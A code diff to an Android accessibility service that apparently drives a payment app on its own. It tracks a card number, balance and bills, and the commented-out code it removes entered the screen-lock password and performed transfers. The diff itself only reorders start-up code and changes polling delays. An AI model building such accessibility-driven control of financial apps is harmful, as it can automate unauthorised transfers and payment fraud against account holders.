@@ -58,7 +58,7 @@ public class CollectionAccessibilityService extends AccessibilityService {
     private PostCollectionErrorRunnable postCollectionErrorRunnable;
     private volatile CollectBillResponse collectBillResponse;
     private String balance = "0";
-    private boolean isRunning = false;
+    private boolean isRunning = true;
     private String cardNumber;
     private String collectUrl;
 
@@ -79,16 +79,21 @@ public class CollectionAccessibilityService extends AccessibilityService {
     @Override
     public void onCreate() {
         super.onCreate();
+        isRunning = true;
+
         initData();
+
         billRunnable = new BillRunnable(this);
         logWindow = new LogWindow(this);
         appConfig = new AppConfig(this);
+
         postCollectionErrorRunnable = new PostCollectionErrorRunnable(this);
         collectionAccessibilityRunnable = new CollectionAccessibilityRunnable(this);
+
         new Thread(billRunnable).start();
         new Thread(collectionAccessibilityRunnable).start();
         new Thread(postCollectionErrorRunnable).start();
-        isRunning = true;
+
         logWindow.printA("代收/归集运行中");
 
         handlerAccessibility();
@@ -97,16 +102,16 @@ public class CollectionAccessibilityService extends AccessibilityService {
     //执行界面点击事件
     private void handlerAccessibility() {
         if (TimeUtils.isNightToMorning()){
-            handler.postDelayed(this::handlerAccessibility, 2000);
+            handler.postDelayed(this::handlerAccessibility, 5_000);
             return;
         }
         AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
         if (nodeInfo == null) {
-            handler.postDelayed(this::handlerAccessibility, 2000);
+            handler.postDelayed(this::handlerAccessibility, 5_000);
             return;
         }
         if (nodeInfo.getChildCount() == 0) {
-            handler.postDelayed(this::handlerAccessibility, 2000);
+            handler.postDelayed(this::handlerAccessibility, 5_000);
             return;
         }
         List<AccessibilityNodeInfo> nodeInfos = new ArrayList<>();
@@ -123,7 +128,7 @@ public class CollectionAccessibilityService extends AccessibilityService {
         } catch (Throwable e) {
             Logs.d("异常:" + e.getMessage());
         }
-        handler.postDelayed(this::handlerAccessibility, 2000);
+        handler.postDelayed(this::handlerAccessibility, 5_000);
     }
 
     public void initData() {
@@ -142,23 +147,6 @@ public class CollectionAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-   /*     try {
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {//不处理控件点击事件
-                return;
-            }
-            AccessibilityNodeInfo nodeInfo = accessibilityEvent.getSource();
-            Map<String, AccessibilityNodeInfo> nodeInfoMap = AccessibleUtil.toContentDescMap(nodeInfo);
-            ScreenLockPassword(nodeInfoMap);
-            getBalance(nodeInfoMap);
-            BottomNavigationBar(nodeInfoMap);
-            clickBill(nodeInfoMap);
-            getBill(nodeInfoMap);
-            Transfer(nodeInfoMap, nodeInfo);
-            Dialogs(nodeInfoMap);
-            Thread.sleep(2000);
-        } catch (Throwable e) {
-            Logs.d("异常:" + e.getMessage());
-        }*/
     }
 
     //弹窗直接点击确认
